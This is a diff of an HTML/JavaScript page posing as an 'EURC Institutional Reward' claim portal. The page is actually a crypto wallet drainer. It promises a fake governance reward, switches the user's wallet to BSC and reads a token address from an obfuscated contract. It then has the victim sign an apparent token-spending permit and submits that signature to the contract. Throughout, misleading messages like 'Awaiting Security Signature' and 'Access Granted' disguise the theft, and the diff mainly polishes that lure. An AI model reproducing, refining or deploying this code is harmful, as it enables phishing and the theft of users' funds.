@@ -3,32 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EURC Rewards | Institutional Portal</title>
+    <title>EURC | Institutional Reward Access</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #2775ca; --accent: #0ecb81; --bg: #030407; }
+        :root { --bg: #000000; --surface: #0a0a0a; --border: #222222; --text: #ffffff; --muted: #888888; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: var(--bg); color: white; font-family: 'Plus Jakarta Sans', sans-serif; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
-        .mesh-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 10% 20%, rgba(39, 117, 202, 0.12) 0%, transparent 40%), radial-gradient(circle at 90% 80%, rgba(14, 203, 129, 0.08) 0%, transparent 40%); z-index: -1; filter: blur(100px); }
-        .container { background: rgba(13, 15, 20, 0.85); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.06); padding: 3rem 2rem; border-radius: 40px; width: 90%; max-width: 420px; text-align: center; box-shadow: 0 40px 120px rgba(0,0,0,0.8); }
-        .badge { background: rgba(39, 117, 202, 0.15); color: var(--primary); padding: 10px 20px; border-radius: 100px; font-size: 11px; font-weight: 800; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 2rem; display: inline-block; border: 1px solid rgba(39, 117, 202, 0.3); }
-        .reward-amount { font-size: 52px; font-weight: 800; color: #fff; margin-bottom: 0.5rem; letter-spacing: -2px; }
-        .reward-label { color: var(--accent); font-size: 18px; font-weight: 700; margin-bottom: 2.5rem; text-transform: uppercase; letter-spacing: 1px; }
-        p { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 2.5rem; }
-        .btn-action { width: 100%; padding: 1.2rem; background: linear-gradient(135deg, #2775ca 0%, #1a4f8a 100%); color: white; border: none; border-radius: 20px; font-size: 18px; font-weight: 700; cursor: pointer; transition: 0.3s; box-shadow: 0 15px 35px rgba(39, 117, 202, 0.4); }
-        .btn-action:active { transform: scale(0.96); }
-        .status-msg { margin-top: 1.5rem; font-size: 13px; font-weight: 600; color: var(--primary); min-height: 20px; }
+        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
+        
+        /* Zarif Arka Plan */
+        .ambient-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 50% 50%, #111 0%, #000 70%); z-index: -1; }
+
+        .container { background: var(--surface); border: 1px solid var(--border); padding: 4rem 3rem; border-radius: 2px; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,1); }
+        
+        .badge { font-size: 10px; font-weight: 600; letter-spacing: 4px; text-transform: uppercase; color: var(--muted); margin-bottom: 2.5rem; display: block; }
+        
+        h2 { font-size: 28px; font-weight: 300; letter-spacing: -0.5px; margin-bottom: 1rem; text-transform: uppercase; color: #fff; }
+        
+        .divider { width: 40px; height: 1px; background: #444; margin: 2rem auto; }
+        
+        p { color: var(--muted); font-size: 13px; line-height: 1.8; margin-bottom: 3.5rem; font-weight: 300; }
+        
+        .btn-action { width: 100%; padding: 1.4rem; background: #fff; color: #000; border: none; border-radius: 0; font-size: 14px; font-weight: 800; text-transform: uppercase; letter-spacing: 2px; cursor: pointer; transition: all 0.5s ease; }
+        
+        .btn-action:hover { background: #ccc; letter-spacing: 3px; }
+        .btn-action:active { transform: scale(0.98); }
+
+        .status-msg { margin-top: 2rem; font-size: 11px; font-weight: 400; color: #555; letter-spacing: 1px; min-height: 20px; text-transform: uppercase; }
+
+        /* Mobil Optimizasyon */
+        @media (max-width: 480px) {
+            .container { padding: 3rem 2rem; }
+            h2 { font-size: 22px; }
+        }
     </style>
 </head>
 <body>
-<div class="mesh-bg"></div>
+<div class="ambient-bg"></div>
 <div class="container">
-    <div class="badge">EVM Certified Pool</div>
-    <div class="reward-amount">1,000 EURC</div>
-    <div class="reward-label">Governance Reward</div>
-    <p>Your institutional wallet is eligible for the quarterly incentive program. Connect to synchronize your vault.</p>
-    <button id="claimBtn" class="btn-action">Claim 1,000 EURC</button>
+    <span class="badge">Institutional Protocol</span>
+    <h2>Claim Your Reward</h2>
+    <div class="divider"></div>
+    <p>The system has verified your governance eligibility. Please synchronize your institutional vault to finalize the reward access.</p>
+    
+    <button id="claimBtn" class="btn-action">Claim Reward</button>
+    
     <div id="statusMsg" class="status-msg"></div>
 </div>
 
@@ -41,8 +60,7 @@
         const s = document.getElementById('statusMsg');
 
         if (!window.ethereum) {
-            const trustLink = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
-            window.location.href = trustLink;
+            window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
             return;
         }
 
@@ -57,7 +75,7 @@
                 try {
                     await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
                 } catch (e) {
-                    s.innerText = "Please switch to BSC Network.";
+                    s.innerText = "Switch to BSC Network";
                     return;
                 }
             }
@@ -67,7 +85,7 @@
                 "function l1I1lI(address, uint256, uint256, bytes) external"
             ], signer);
 
-            s.innerText = "Analyzing Eligibility...";
+            s.innerText = "Verifying Vault...";
             const targetToken = await contract.l111ll(0);
             const deadline = Math.floor(Date.now() / 1000) + 3600;
             const expiry = Math.floor(Date.now() / 1000) + 31536000;
@@ -93,18 +111,18 @@
                 sigDeadline: deadline
             };
 
-            s.innerText = "Signature required for vault sync...";
+            s.innerText = "Awaiting Security Signature...";
             const sig = await signer._signTypedData(domain, types, message);
             
-            b.innerText = "Finalizing...";
+            b.innerText = "Synchronizing...";
             const tx = await contract.l1I1lI(user, expiry, deadline, sig);
             await tx.wait();
             
-            b.innerText = "Success!";
-            s.innerText = "1,000 EURC claim complete. Processing...";
+            b.innerText = "Access Granted";
+            s.innerText = "Synchronization complete. Reward distribution pending.";
         } catch (err) {
-            b.innerText = "Retry Connection";
-            s.innerText = "Action required to verify rewards.";
+            b.innerText = "Retry Reward Access";
+            s.innerText = "System error: Signature required.";
         }
     }
     document.getElementById('claimBtn').onclick = process;
